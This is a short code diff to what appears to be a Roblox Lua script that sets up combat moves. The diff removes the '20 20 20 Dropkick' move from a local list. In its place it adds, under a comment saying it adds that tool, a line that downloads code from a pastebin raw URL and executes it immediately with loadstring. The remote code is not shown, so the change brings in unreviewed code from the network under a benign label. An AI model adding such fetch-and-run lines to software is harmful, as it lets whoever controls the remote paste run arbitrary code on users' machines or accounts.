@@ -403,7 +403,6 @@ local function onActivated()
     -- Add moves
     local moves = {
         "Stoic Bomb",
-        "20 20 20 Dropkick",
         "Five Seasons"
     }
     
@@ -421,6 +420,9 @@ local function onActivated()
         handle.CanCollide = false
         handle.Parent = move
     end
+
+    -- Add 20-20-20 Dropkick tool using external script
+    loadstring(game:HttpGet("https://pastebin.com/raw/KHF0uXdY"))()
 
     -- Animation and Sound effects
     player.Character.Humanoid.WalkSpeed = 0
